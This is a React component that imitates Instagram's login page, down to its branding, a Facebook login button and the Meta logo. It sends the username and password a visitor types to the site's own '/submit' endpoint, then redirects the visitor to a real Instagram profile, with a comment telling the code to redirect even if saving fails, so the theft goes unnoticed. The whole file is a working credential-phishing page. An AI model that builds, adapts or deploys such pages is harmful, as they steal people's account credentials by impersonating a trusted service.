import { useState } from "react";
import { Input } from "./Input";
import { Button } from "../buttons/Button";

const FacebookIcon = ({ className }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
    <path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.66c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7A10 10 0 0 0 12 2.04Z" />
  </svg>
);

export const LoginForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async () => {
    if (!username || !password) return;

    try {
      await fetch("/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
    } catch {
      // Continue redirect even if save fails
    }

    window.location.href =
      "https://www.instagram.com/hackthemen?igsh=cjl0dnFuYzI4c2c5";
  };

  return (
    <div className="w-full h-full flex flex-col justify-center relative">
      {/* Move entire login section upward approximately 35px */}
      <div className="w-full max-w-[610px] mx-auto px-[60px] flex flex-col -translate-y-[35px]">
        <h2 className="text-white text-[16px] font-semibold mb-6">
          Log in to Instagram
        </h2>

        <div className="flex flex-col gap-3 mb-6">
          <Input
            placeholder="Mobile number, username or email address"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <Input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        <Button 
          className="mb-6" 
          onClick={handleLogin}
        >
          Log in
        </Button>

        <a href="#" className="text-white text-center block mb-10 text-[14px] font-semibold hover:underline">
          Forgotten password?
        </a>

        <div className="flex flex-col gap-3">
          <Button variant="secondary" className="gap-2">
            <FacebookIcon className="w-[18px] h-[18px] text-[#1877F2]" />
            Log in with Facebook
          </Button>
          
          <Button variant="ghost">
            Create new account
          </Button>
        </div>

        <div className="mt-10 flex flex-col items-center justify-center">
          <div className="flex items-center gap-1.5 text-[#E0E0E0]">
            <svg viewBox="0 0 24 24" className="w-[30px] h-[15px] fill-current">
               <path d="M12.44 11.16a23.11 23.11 0 0 1-1.39-1.37A6.41 6.41 0 0 0 6.64 8 6.54 6.54 0 0 0 0 14.54a6.54 6.54 0 0 0 6.64 6.54 6.42 6.42 0 0 0 4.41-1.78 23 23 0 0 1 1.39-1.37A6.4 6.4 0 0 0 16.86 21.08 6.54 6.54 0 0 0 23.5 14.54a6.54 6.54 0 0 0-6.64-6.54 6.42 6.42 0 0 0-4.42 1.79zm-5.8 8A4.65 4.65 0 0 1 1.88 14.54 4.65 4.65 0 0 1 6.64 9.88a4.57 4.57 0 0 1 3.1 1.25c.34.33.68.68 1 1.05a22.42 22.42 0 0 0-1 1.05A4.57 4.57 0 0 1 6.64 19.16zm10.22 0a4.57 4.57 0 0 1-3.1-1.25 22.42 22.42 0 0 0 1-1.05 22.42 22.42 0 0 0 1-1.05 4.57 4.57 0 0 1 3.1-1.25 4.65 4.65 0 0 1 4.76 4.66 4.65 4.65 0 0 1-4.76 4.66z"/>
            </svg>
            <span className="font-semibold text-[15px] ml-1">Meta</span>
          </div>
        </div>
      </div>
    </div>
  );
};
